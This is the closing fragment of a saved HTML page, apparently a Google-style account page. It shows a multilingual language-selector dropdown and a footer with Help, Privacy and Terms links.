                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">‫العربية‬‎</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="fa"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">‫فارسی‬‎</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="am"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">አማርኛ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ne"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">नेपाली</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="mr"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">मराठी</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="hi"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">हिन्दी</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="as"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">অসমীয়া</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="bn"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">বাংলা</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="pa"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ਪੰਜਾਬੀ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="gu"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ગુજરાતી</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="or"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ଓଡ଼ିଆ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ta"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">தமிழ்</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="te"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">తెలుగు</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="kn"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ಕನ್ನಡ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ml"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">മലയാളം</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="si"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">සිංහල</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="th"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ไทย</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="lo"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ລາວ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="my"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">မြန်မာ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="km"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">ខ្មែរ</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ko"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">한국어</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="zh-HK"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">中文（香港）</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ja"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">日本語</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="zh-CN"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">简体中文</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="zh-TW"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">繁體中文</span></span>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <ul class="HwzH1e">
              <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="" target="_blank">Help</a></li>
              <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="" target="_blank">Privacy</a></li>
              <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="" target="_blank">Terms</a></li>
            </ul>
          </footer>
          <c-data id="i1" jsdata=" OsjLy;_;1"></c-data>
        </c-wiz>
        <script data-savepage-type="" type="text/plain" aria-hidden="true" nonce=""></script>
      </div>
    </div>
   
    <div aria-live="assertive" aria-relevant="additions" aria-atomic="true" style="color: transparent; z-index: -1; position: absolute; top: 0px; left: 0px; user-select: none;" aria-hidden="true"><div aria-atomic="true">Welcome</div></div>
   
  </body>
</html>
